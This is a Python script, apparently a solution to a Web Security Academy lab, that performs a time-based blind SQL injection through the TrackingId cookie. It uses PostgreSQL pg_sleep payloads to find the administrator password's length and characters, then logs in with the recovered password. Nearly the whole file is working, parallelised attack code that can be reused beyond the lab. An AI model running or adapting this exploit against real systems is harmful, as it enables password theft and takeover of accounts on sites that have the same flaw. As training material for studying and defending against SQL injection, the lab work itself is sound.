import asyncio
import aiohttp
import time
import urllib.parse

BASE_URL = "https://0ade00ea036d16fe800e1cb8000f00b8.web-security-academy.net"
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"

async def test_payload(session: aiohttp.ClientSession, payload: str) -> float:
    """測試 payload 並返回響應時間"""
    cookies = {
        "TrackingId": payload,
        "session": "aa"
    }
    
    start_time = time.time()
    try:
        async with session.get(BASE_URL, cookies=cookies, timeout=15) as resp:
            await resp.text()  # 確保完整接收響應
            elapsed = time.time() - start_time
            return elapsed
    except Exception as e:
        print(f"Request error: {e}")
        return 0.0

async def find_char(session: aiohttp.ClientSession, pos: int) -> str:
    """找出指定位置的密碼字元"""
    for word in WORD_LIST:
        payload = (
            f"';select case when (username='administrator' and "
            f"substring(password,{pos},1)='{word}') "
            f"then pg_sleep(8) else pg_sleep(0) end from users-- "
        )
        
        elapsed = await test_payload(session, urllib.parse.quote(payload))
        
        if elapsed > 7:  # 如果延遲超過 7 秒，表示找到了
            print(f"pos:{pos}, word:{word} === (time: {elapsed:.2f}s)")
            return word
    
    print(f"pos:{pos}, word:? (not found)")
    return "?"

async def find_pw(session: aiohttp.ClientSession, pw_len: int) -> str:
    """並行找出完整密碼"""
    print(f"Starting parallel password discovery for {pw_len} positions...")
    
    # 為每個位置創建一個任務
    tasks = [find_char(session, pos) for pos in range(1, pw_len + 1)]
    
    # 並行執行所有任務
    results = await asyncio.gather(*tasks)
    
    return "".join(results)

async def find_pw_len(session: aiohttp.ClientSession, max_len: int = 25) -> int:
    """使用二分法找出密碼長度"""
    print("Finding password length...")
    low, high = 1, max_len
    
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"';select case when (username='administrator' and length(password)>{mid}) "
            f"then pg_sleep(5) else pg_sleep(0) end from users-- "
        )
        
        print(f"Testing length > {mid}")
        elapsed = await test_payload(session, urllib.parse.quote(payload))
        
        if elapsed > 4:
            low = mid + 1
        else:
            high = mid - 1
    
    print(f"Password length: {low}")
    return low

def login(password: str):
    """使用找到的密碼登入"""
    import requests
    from bs4 import BeautifulSoup
    
    session = requests.Session()
    url = BASE_URL + "/login"
    
    # 獲取 CSRF token
    get_response = session.get(url, timeout=10)
    soup = BeautifulSoup(get_response.text, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})
    
    if not csrf_input:
        print("Failed to get CSRF token")
        return
    
    csrf = csrf_input.get("value")
    
    # 登入
    body = {
        "csrf": csrf,
        "username": "administrator",
        "password": password
    }
    
    post_response = session.post(url, data=body, timeout=10)
    
    if "Your username is: administrator" in post_response.text:
        print("*** LOGIN SUCCESS! ***")
    else:
        print("Login failed")

async def main():
    # 設定連接器以允許更多並發連接
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # 1. 找出密碼長度
        pw_len = await find_pw_len(session)
        print(f"[+] Password length: {pw_len}")
        
        if pw_len <= 0:
            print("Failed to determine password length")
            return
        
        # 2. 並行找出完整密碼
        pw = await find_pw(session, pw_len)
        print(f"[+] Found password: {pw}")
        
        # 3. 嘗試登入
        if pw and '?' not in pw:
            login(pw)
        else:
            print(f"Password discovery incomplete: {pw}")

if __name__ == "__main__":
    asyncio.run(main())